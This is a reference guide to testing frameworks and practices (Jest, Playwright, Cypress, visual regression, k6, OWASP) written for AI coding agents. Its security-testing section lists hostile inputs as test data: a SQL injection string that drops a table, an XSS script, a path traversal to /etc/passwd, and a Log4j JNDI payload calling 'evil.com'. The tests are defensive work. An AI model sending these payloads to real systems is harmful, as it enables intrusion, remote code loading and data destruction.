# QA/Testing Skills & Frameworks Research for AI Coding Agents
*Research compiled: 2026-03-06*

This document compiles popular and well-regarded QA/testing skills and frameworks that would be valuable for AI coding agents to master.

## Executive Summary

Modern AI coding agents should be proficient across multiple testing disciplines:
- **Unit/Integration Testing**: Jest (JavaScript ecosystem leader)
- **E2E Testing**: Playwright (most modern, reliable) and Cypress (mature, developer-friendly)
- **Visual Testing**: Multiple solutions (Percy, Applitools, Chromatic)
- **Performance Testing**: k6 (developer-centric load testing)
- **Security Testing**: OWASP Top 10 patterns and automated scanning
- **TDD Patterns**: Classical vs London schools, with Discovery Testing as modern evolution

## 1. Testing Frameworks

### 1.1 Jest - Unit & Integration Testing Leader

**What it is**: JavaScript testing framework optimized for React applications but works with any JavaScript project.

**Key Features**:
- Zero configuration setup
- Built-in mocking, assertions, and code coverage
- Snapshot testing for UI components
- Parallel test execution
- Watch mode for rapid feedback

**AI Agent Value**:
- Most popular JS testing framework (industry standard)
- Rich matcher library reduces boilerplate
- Excellent TypeScript support
- Integration with major bundlers (webpack, Vite, Parcel)

**Basic Usage**:
```javascript
// sum.js
function sum(a, b) {
  return a + b;
}
module.exports = sum;

// sum.test.js
const sum = require('./sum');

test('adds 1 + 2 to equal 3', () => {
  expect(sum(1, 2)).toBe(3);
});
```

**Installation**: `npm install --save-dev jest`

### 1.2 Playwright - Modern E2E Testing

**What it is**: Next-generation end-to-end testing framework by Microsoft.

**Key Advantages**:
- Cross-browser support (Chromium, Firefox, WebKit)
- Auto-waiting (no flaky timeouts)
- Network interception and mocking
- Parallel execution across browsers
- Rich debugging tools with trace viewer
- Mobile device emulation

**AI Agent Value**:
- Most reliable E2E framework (designed to eliminate flakes)
- Excellent developer experience with codegen
- Strong TypeScript support
- Built-in visual testing capabilities

**Core Features**:
- Time travel debugging
- Network traffic control
- Automatic screenshots/videos on failure
- CI/CD optimized (fast, reliable)

**Installation**: `npm init playwright@latest`

### 1.3 Cypress - Developer-Friendly E2E Testing

**What it is**: JavaScript-based end-to-end testing framework with unique architecture.

**Key Differentiators**:
- Runs inside the browser (not external like Selenium)
- Real-time reloads during test development
- Time-travel debugging with DOM snapshots
- Automatic waiting and retry logic
- Rich ecosystem of plugins

**Unique Architecture Benefits**:
- Native access to application objects
- Synchronous command execution
- Built-in stubbing and mocking
- Real browser events

**AI Agent Value**:
- Excellent for component testing
- Strong visual testing ecosystem
- Great documentation and learning resources
- Active community and plugin ecosystem

**Basic E2E Test**:
```javascript
it('completes todo', () => {
  cy.visit('/')
  cy.get('.new-todo').type('write tests{enter}')
  cy.contains('.todo-list li', 'write tests').find('.toggle').check()
  cy.contains('.todo-list li', 'write tests').should('have.class', 'completed')
})
```

### 1.4 Framework Comparison for AI Agents

| Framework | Best For | Learning Curve | Reliability | Ecosystem |
|-----------|----------|---------------|-------------|-----------|
| **Jest** | Unit/Integration | Low | High | Excellent |
| **Playwright** | E2E, Cross-browser | Medium | Very High | Growing |
| **Cypress** | E2E, Component | Low | High | Mature |

**Recommendation**: AI agents should be proficient in Jest + Playwright combination for comprehensive coverage.

## 2. Test-Driven Development (TDD) Patterns

### 2.1 Core TDD Principle

TDD is "writing new production code by first writing a failing test that demands the code into existence."

**Benefits**:
- Reduces defects
- Improves code design
- Increases focus via tight feedback loops
- Prevents over-engineering (YAGNI principle)

### 2.2 TDD Schools of Thought

#### Classical (Detroit School) TDD
- Tests real objects and their interactions
- Mocks used sparingly (only for external dependencies)
- Focus on state verification
- Results in more integrated tests

#### London School (Mockist) TDD
- Heavy use of mocks for all dependencies
- Tests interactions between objects
- Each test focuses on one unit in isolation
- Results in more granular tests

#### Discovery Testing (Modern Evolution)
- Iterative approach building on London school ideas
- Emphasis on discovering design through test-first development
- Balances isolation with integration
- More pragmatic approach to mocking

### 2.3 AI Agent TDD Implementation

**Red-Green-Refactor Cycle**:
1. **Red**: Write a failing test
2. **Green**: Write minimum code to pass
3. **Refactor**: Improve code while keeping tests green

**AI Agent Advantages**:
- Can rapidly generate test cases
- Excellent at following TDD discipline
- Can suggest refactoring opportunities
- Natural fit for the methodical TDD process

## 3. E2E Testing Best Practices

### 3.1 Core Principles

**Test Pyramid Adherence**:
- Few E2E tests (expensive, slow)
- More integration tests
- Many unit tests (fast, reliable)

**Page Object Model**:
```javascript
// pages/LoginPage.js
class LoginPage {
  constructor(page) {
    this.page = page;
    this.usernameField = page.locator('#username');
    this.passwordField = page.locator('#password');
    this.submitButton = page.locator('#submit');
  }

  async login(username, password) {
    await this.usernameField.fill(username);
    await this.passwordField.fill(password);
    await this.submitButton.click();
  }
}
```

### 3.2 Playwright Best Practices

**Locator Strategy**:
```javascript
// Good: Stable, semantic locators
await page.getByRole('button', { name: 'Submit' }).click();
await page.getByTestId('user-profile').click();

// Avoid: Fragile CSS selectors
await page.locator('.btn-primary.submit-btn').click();
```

**Auto-waiting**:
```javascript
// Playwright waits automatically
await page.locator('#results').waitFor(); // Usually unnecessary
await expect(page.locator('#results')).toBeVisible(); // Preferred
```

**Network Control**:
```javascript
// Mock API responses
await page.route('/api/users', async route => {
  await route.fulfill({
    status: 200,
    body: JSON.stringify([{ id: 1, name: 'Test User' }])
  });
});
```

### 3.3 Cypress Best Practices

**Command Chaining**:
```javascript
cy.get('[data-cy=user-list]')
  .should('be.visible')
  .find('[data-cy=user-item]')
  .first()
  .click();
```

**Custom Commands**:
```javascript
// cypress/support/commands.js
Cypress.Commands.add('login', (username, password) => {
  cy.visit('/login');
  cy.get('[data-cy=username]').type(username);
  cy.get('[data-cy=password]').type(password);
  cy.get('[data-cy=submit]').click();
});

// Usage in tests
cy.login('user@example.com', 'password123');
```

### 3.4 Cross-Framework Best Practices

**Data Management**:
- Use fixtures for consistent test data
- Reset state between tests
- Mock external services

**Assertions**:
- Prefer semantic assertions over implementation details
- Assert on user-visible behavior
- Use wait conditions appropriately

## 4. Visual Regression Testing

### 4.1 Concept & Value

Visual regression testing captures images of UI components/pages and compares them against baseline images to detect visual changes.

**When to Use**:
- CSS/styling changes could break layout
- Complex UI components with visual states
- Cross-browser rendering verification
- Design system compliance checking

### 4.2 Popular Tools & Services

#### Percy (BrowserStack)
- **Strengths**: Mature platform, good CI/CD integration
- **Use case**: Teams wanting managed visual testing service
- **Docs**: https://docs.percy.io/docs/cypress

#### Applitools
- **Strengths**: AI-powered visual AI, smart comparisons
- **Use case**: Enterprise teams, complex applications
- **Features**: Cross-browser, cross-device testing
- **Docs**: https://applitools.com/cypress

#### Chromatic (Storybook)
- **Strengths**: Tight Storybook integration, component-focused
- **Use case**: Teams using Storybook for component development
- **Features**: Component isolation, design system testing

#### Argos (Open Source Friendly)
- **Strengths**: Affordable, good GitHub integration
- **Use case**: Open source projects, cost-conscious teams

### 4.3 Implementation Best Practices

**DOM State Control**:
```javascript
// Bad: Timing-dependent
cy.get('.new-todo').type('write tests{enter}')
cy.mySnapshotCommand() // May capture before item appears

// Good: Wait for stable state
cy.get('.new-todo').type('write tests{enter}')
cy.contains('.todo-list li', 'write tests') // Ensure item exists
cy.mySnapshotCommand()
```

**Timestamp Control**:
```javascript
// Freeze time for consistent screenshots
const now = new Date(2018, 1, 1)
cy.clock(now)
// ... test actions
cy.mySnapshotCommand()
```

**Element-Specific Testing**:
```javascript
// Better: Test specific components
cy.get('.user-profile').toMatchImageSnapshot()

// Avoid: Full page (brittle, hard to debug)
cy.toMatchImageSnapshot()
```

### 4.4 AI Agent Considerations

**Automated Visual Testing**:
- Generate comprehensive visual test suites
- Identify critical user flows for visual coverage
- Suggest component boundaries for testing
- Automate baseline generation and maintenance

## 5. Performance Testing Tools

### 5.1 k6 - Developer-Centric Load Testing

**What it is**: Open-source load testing tool by Grafana optimized for developer experience.

**Key Features**:
- JavaScript ES6+ test scripts
- Built-in metrics and thresholds
- CI/CD integration
- Cloud and on-premise execution
- Protocol support (HTTP, WebSockets, gRPC)

**AI Agent Value**:
- Script-based (easy to generate/modify)
- Excellent for API load testing
- Good documentation and examples
- Integrates with monitoring stacks

**Basic Load Test**:
```javascript
import http from 'k6/http';
import { sleep, check } from 'k6';

export let options = {
  vus: 10, // Virtual users
  duration: '30s',
};

export default function () {
  let response = http.get('https://test.k6.io');
  check(response, {
    'status is 200': (r) => r.status === 200,
    'response time < 500ms': (r) => r.timings.duration < 500,
  });
  sleep(1);
}
```

**Test Types Supported**:
- Spike testing (sudden load increases)
- Stress testing (beyond normal capacity)
- Soak testing (sustained load over time)
- Volume testing (large amounts of data)

### 5.2 Browser Performance Testing

**Playwright Performance**:
```javascript
// Capture performance metrics
const metrics = await page.evaluate(() => {
  const navigation = performance.getEntriesByType('navigation')[0];
  return {
    domContentLoaded: navigation.domContentLoadedEventEnd - navigation.domContentLoadedEventStart,
    loadComplete: navigation.loadEventEnd - navigation.loadEventStart,
    firstPaint: performance.getEntriesByName('first-paint')[0]?.startTime,
    firstContentfulPaint: performance.getEntriesByName('first-contentful-paint')[0]?.startTime
  };
});
```

**k6 Browser Module**:
```javascript
import { browser } from 'k6/experimental/browser';

export default async function () {
  const page = browser.newPage();
  
  await page.goto('https://test.k6.io');
  
  // Collect browser metrics
  const metrics = await page.evaluate(() => ({
    loadTime: window.performance.timing.loadEventEnd - window.performance.timing.navigationStart,
    domReady: window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart
  }));
}
```

### 5.3 Performance Testing Strategy for AI Agents

**Automated Performance Baseline**:
- Generate performance tests for critical user journeys
- Establish performance budgets automatically
- Monitor key metrics (response time, throughput, error rate)
- Integrate with CI/CD for regression detection

**Key Metrics to Track**:
- Response time percentiles (50th, 95th, 99th)
- Requests per second (RPS)
- Error rate percentage
- Resource utilization

## 6. Security Testing (OWASP Patterns)

### 6.1 OWASP Top 10 2025 Overview

The OWASP Top 10 represents the most critical web application security risks globally recognized by developers.

**Purpose**: Standard awareness document for developers and security teams to address critical security risks.

### 6.2 Core Security Testing Areas

#### A01: Injection Vulnerabilities
**Pattern**: Untrusted data sent to interpreter as part of command/query

**Testing Strategy**:
```javascript
// SQL Injection Test
test('prevents SQL injection in user search', async () => {
  const maliciousInput = "'; DROP TABLE users; --";
  const response = await api.post('/search', { query: maliciousInput });
  
  expect(response.status).toBe(400); // Should reject malicious input
  expect(response.body.error).toContain('invalid input');
});
```

#### A02: Broken Authentication
**Pattern**: Flawed authentication and session management

**Testing Strategy**:
```javascript
test('enforces session timeout', async () => {
  // Login and get session
  const session = await login('user', 'password');
  
  // Wait for timeout period
  await sleep(SESSION_TIMEOUT + 1000);
  
  // Attempt protected action
  const response = await api.get('/protected', { 
    headers: { Authorization: session.token }
  });
  
  expect(response.status).toBe(401);
});
```

#### A03: Sensitive Data Exposure
**Pattern**: Insufficient protection of sensitive information

**Testing Strategy**:
```javascript
test('masks sensitive data in responses', async () => {
  const response = await api.get('/user/profile');
  
  expect(response.body.creditCard).toMatch(/\*{12}\d{4}/); // Only last 4 digits
  expect(response.body).not.toHaveProperty('password');
  expect(response.body).not.toHaveProperty('ssn');
});
```

### 6.3 Automated Security Testing Tools

#### OWASP ZAP Integration
```javascript
// Cypress with OWASP ZAP
const zapClient = require('zaproxy');

describe('Security Tests', () => {
  before(() => {
    // Start ZAP proxy
    zapClient.spider.scan('http://localhost:3000');
  });

  it('scans for vulnerabilities', () => {
    cy.zapBaseline(); // Custom command for ZAP baseline scan
  });
});
```

#### Security-Focused Test Patterns
```javascript
// Input validation testing
const securityTestData = [
  '<script>alert("xss")</script>',
  '../../../etc/passwd',
  '{{7*7}}', // Template injection
  '${jndi:ldap://evil.com}', // Log4j injection
];

securityTestData.forEach(payload => {
  test(`rejects malicious input: ${payload}`, async () => {
    const response = await api.post('/submit', { data: payload });
    expect(response.status).toBe(400);
  });
});
```

### 6.4 Security Testing Strategy for AI Agents

**Automated Security Test Generation**:
- Generate security test cases based on OWASP Top 10
- Create input validation tests for all endpoints
- Implement authentication/authorization test suites
- Add security regression tests to CI/CD

**Key Security Test Categories**:
1. Input validation and sanitization
2. Authentication and session management
3. Authorization and access control
4. Data encryption and protection
5. Error handling and information disclosure

## 7. Integration Strategy for AI Coding Agents

### 7.1 Multi-Framework Competency

**Recommended Stack for AI Agents**:
- **Unit Testing**: Jest (JavaScript/TypeScript ecosystem)
- **E2E Testing**: Playwright (primary) + Cypress (secondary)
- **Visual Testing**: Percy or Applitools integration
- **Performance**: k6 for load testing
- **Security**: OWASP ZAP integration + custom security tests

### 7.2 Test Generation Capabilities

**AI Agent Advantages**:
1. **Comprehensive Coverage**: Generate tests across multiple layers
2. **Pattern Recognition**: Identify common security/performance issues
3. **Rapid Iteration**: Quickly adapt tests based on code changes
4. **Best Practice Enforcement**: Apply framework-specific best practices

### 7.3 Quality Gates Implementation

**CI/CD Integration**:
```yaml
# Example GitHub Actions workflow
name: QA Pipeline
on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm ci
      - run: npm run test:unit
      
  e2e-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npx playwright install
      - run: npm run test:e2e
      
  performance-tests:
    runs-on: ubuntu-latest
    steps:
      - run: k6 run performance-test.js
      
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - run: npm audit
      - run: docker run -v $(pwd):/zap/wrk/:rw owasp/zap2docker-stable zap-baseline.py
```

## 8. Learning Resources & References

### 8.1 Official Documentation
- **Jest**: https://jestjs.io/docs/getting-started
- **Playwright**: https://playwright.dev/docs/intro
- **Cypress**: https://docs.cypress.io/guides/overview/why-cypress
- **k6**: https://grafana.com/docs/k6/latest/
- **OWASP**: https://owasp.org/www-project-top-ten/

### 8.2 Best Practice Guides
- **TDD Patterns**: https://github.com/testdouble/contributing-tests/wiki/Test-Driven-Development
- **Cypress Real World App**: https://github.com/cypress-io/cypress-realworld-app
- **Playwright Best Practices**: https://playwright.dev/docs/best-practices

### 8.3 Community Resources
- **Testing JavaScript**: Kent C. Dodds' testing philosophy
- **OWASP Testing Guide**: Comprehensive security testing methodology
- **k6 Community**: Performance testing patterns and examples

## Conclusion

AI coding agents should develop competency across this full testing spectrum to provide comprehensive QA capabilities. The combination of Jest, Playwright, visual testing tools, k6, and OWASP security patterns provides a solid foundation for modern web application testing.

The key is balancing automation capabilities with testing best practices, ensuring that generated tests are maintainable, reliable, and provide meaningful feedback to development teams.

*Research compiled from official documentation, community best practices, and industry standards as of March 2026.*